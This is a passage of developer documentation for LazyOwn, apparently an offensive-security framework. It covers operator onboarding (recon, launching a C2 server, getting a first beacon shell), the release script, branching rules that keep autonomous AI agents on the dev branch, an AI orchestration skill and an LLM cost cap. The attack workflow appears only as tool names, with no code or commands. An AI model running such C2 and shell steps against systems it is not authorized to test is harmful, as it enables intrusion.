`QUICKSTART.md`: canonical operator onboarding. **Manual** — update when flow changes. Sections: prereqs → clone + `bash install.sh` → `wizard` (7 steps: rhost, lhost, domain, device, os_id, api_key, wordlists) → recon (`ping` → `lazynmap` → `auto_populate` → `facts_show`) → C2 (`fast_run_as_r00t.sh` or `lazyc2`) → first shell (Go beacon or `blacksandbeacon`) → `collab_join` → command/files reference + troubleshooting.

`cli/wizard.py`: **never** imports `lazyown.py`/`lazyc2.py` (DIP). Takes `params: dict` + `save: Callable` — doesn't touch `payload.json` directly. Output via `rich`. Auto-detects `lhost` from routing table, SecLists from candidate dirs. Run: `wizard` or `wizard --check`. Auto-launched on first run when `rhost` unset.

---

## 15f. Release pipeline — `DEPLOY.sh`

`DEPLOY.sh` (repo root, not `./DEPLOY`):
1. Rebuilds `README.md` from `UTILS.md` + `COMMANDS.md` + `CHANGELOG.md`.
2. Regenerates `docs/index.html`.
3. Prompts: commit type, typedesc, subject, body.
4. Bumps `version.json`.
5. Signed git commit + tag (`release/0.x.y`).
6. Pushes `origin/main` + creates GH release.

Non-interactive: `printf "1\nfeat\nsubject\nbody\n" | bash DEPLOY.sh --no-test`

Type → bump: `feat/feature/fix/hotfix` = patch; `refactor/docs/test/style` = none; `release` = major; `patch` = minor.

`--no-test` skips tests — only when verified separately.

**Does NOT**: run pytest; validate `CLAUDE.md`. `CHANGELOG.md` truncated to 120k chars in GH release body; full in file.

---

## 15g. Branching strategy (law)

LazyOwn uses a three-branch model to separate development, pre-production and production. This is **law**, not preference. Direct commits to `pp` or `main` are rejected at review.

| Branch | Purpose | Who merges into it |
|--------|---------|-------------------|
| `dev`  | Active development, feature integration, daily commits. | Feature branches (via PR) |
| `pp`   | Pre-production / staging. Stable enough for QA and integration tests. | `dev` (fast-forward or merge commit after QA) |
| `main` | Production releases. Only tested, tagged releases live here. | `pp` (via PR with release notes) |

### Rules

- **Never commit directly to `main` or `pp`.** All work starts in `dev` or a feature branch cut from `dev`.
- **Release flow**: `feature/*` -> `dev` -> `pp` -> `main`.
- **Hotfix flow**: branch from `main`, fix, PR to `main`, then back-merge to `pp` and `dev`.
- **Agent autonomy**: Autonomous agents (Claude, Groq, SWAN) operate on `dev`. Human operator approves promotion to `pp`.
- **Tagging**: Only `main` receives version tags (`release/0.x.y`).

### CI implications

`DEPLOY.sh` runs against `main`. If you are on `dev` or `pp`, use `--no-test` only after local pytest passes.

---

## 15h. claude_md_orchestrator skill

`skills/claude_md_orchestrator/` is the production implementation of
the SDD plus TDD plus BDD plus Boy Scout cycle the methodology
section declares. The skill reads a CLAUDE.md, lifts every
actionable contract, and walks each one through six stages:

1. Spec-Driven Development — `sdd_agent.py` writes `specs/<id>.yaml`.
2. Test-Driven Development — `tdd_agent.py` writes
   `tests/test_<id>.py` and the cycle halts at red.
3. Behavior-Driven Development — `bdd_agent.py` writes `src/<id>.py`
   and the cycle halts at green.
4. Code Reviewer — `reviewer_agent.py` runs ruff, mypy, bandit, and
   the in house DoD validators.
5. Documentation — `documentation_agent.py` emits first person
   scientific English inside a markdown fence, signed by `grisun0`.
6. CI and CD — `cicd_agent.py` cuts a feature branch from `dev`,
   writes the GitHub Actions workflow, and prepares the PR body.
   The deploy gate is closed by default and only opens when the
   operator passes the `LAZYOWN_DEPLOY_GATE_TOKEN` environment value.

The orchestrator persists the cycle state to `state.json` after every
stage so a crash resumes from the last green stage. The orchestrator
is invoked through:

```bash
PYTHONPATH=skills python3 -m claude_md_orchestrator.orchestrator \
  --no-parse --seed C-002
```

Tests live in `skills/claude_md_orchestrator/tests/`. The first flank
the skill closed is the CI hardening gap. The legacy `test.yml` and
`ci.yml` workflows no longer swallow failures through the
`|| true` shim or the `continue-on-error: true` flag. The new
`test_strict.yml` workflow runs ruff, mypy, bandit, and pytest on
every push to `main` and on every pull request targeting `main`. The
contract is pinned by `tests/test_ci_strict.py`.

---

## 15i. LLM budget cap

`core/llm_budget.py` is the production implementation of the daily
LLM cost cap and the per call token cap the operator configures
through `payload.json`. The factory wraps every backend with the
proxy so the cap is enforced at the single chokepoint the framework
uses. The proxy never crashes a call: the proxy raises
`BudgetExceeded` only when the cap is breached. The proxy persists
the spend to `sessions/llm_budget.json` so a process restart does
not reset the counter inside the same calendar day.

| Key | Default | Purpose |
|-----|---------|---------|
| `llm_daily_budget_usd` | `1.0` | Maximum spend per calendar day in United States dollars. |
| `llm_per_call_token_cap` | `8000` | Maximum input tokens per call. |
| `llm_budget_enabled` | `true` | When `false` the proxy passes the call through without recording. |
| `llm_reset_at_utc` | `00:00` | UTC time the ledger rolls over. |
| `llm_model_prices` | Groq and Ollama defaults | Per model price table in United States dollars per million tokens. |

Pricing follows the OpenAI style model. Groq llama-3.3-70b-versatile
ships at 0.59 United States dollars per million input tokens and 0.79
United States dollars per million output tokens. Ollama models ship
at zero because the operator runs the model on the local host. The
operator may override every value through `payload.json`.

The proxy is import tolerant. When the `tiktoken` dependency is
missing the estimator falls back to a whitespace tokeniser that still
produces a deterministic count. When the `core.llm_budget` module
fails to import the factory returns the raw backend so a missing
dependency never blocks the operator.

The CLI command `llm_budget` shows the structured status block. The
command accepts three subcommands: `llm_budget` for the human
readable block, `llm_budget json` for the structured object, and
`llm_budget reset` to clear the ledger after the operator confirms
the action. The MCP tool `lazyown_get_llm_budget` returns the same
structured object the JSON subcommand prints. Tests live in
`tests/test_llm_budget.py` and pin the contract the spec declares.

---

## 16. Read next

- `QUICKSTART.md` — start here for a new operator session.
- `README.md` — public feature list (auto-regenerated by `DEPLOY.sh`).
- `COMMANDS.md` — every CLI command (auto-generated).
- `UTILS.md` — `utils.py` reference (auto-generated).
- `CHANGELOG.md` — release history.
- `skills/lazyown.md` — MCP playbook (mandatory before MCP session).
- `skills/README.md` — skills architecture + 95 MCP tools.
- `<dir>/README.md` — every directory; read before editing.

When in doubt: read `payload.json` → `sessions/` → directory's `README.md` → then write code.
